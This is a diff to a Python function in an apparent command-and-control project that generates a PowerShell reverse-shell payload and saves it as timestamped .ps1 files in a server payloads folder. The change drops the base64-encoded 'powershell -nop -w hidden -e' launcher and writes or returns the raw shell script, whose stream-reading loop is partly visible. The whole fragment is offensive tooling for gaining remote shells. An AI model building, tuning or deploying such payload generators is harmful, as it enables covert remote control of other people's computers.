@@ -45,19 +45,17 @@ while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{
     $stream.Flush();
 }}
 """
-    encoded_shell = base64.b64encode(core_shell.encode('utf-8')).decode()
-    final_payload = f"powershell -nop -w hidden -e {encoded_shell}"
-
     if write_file:
         folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
         os.makedirs(folder, exist_ok=True)
         filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
         path = os.path.join(folder, filename)
         with open(path, 'w') as f:
-            f.write(final_payload)
+            f.write(core_shell)
         return filename
     else:
-        return final_payload
+        return core_shell
+
 
 
 # Alias for your other code
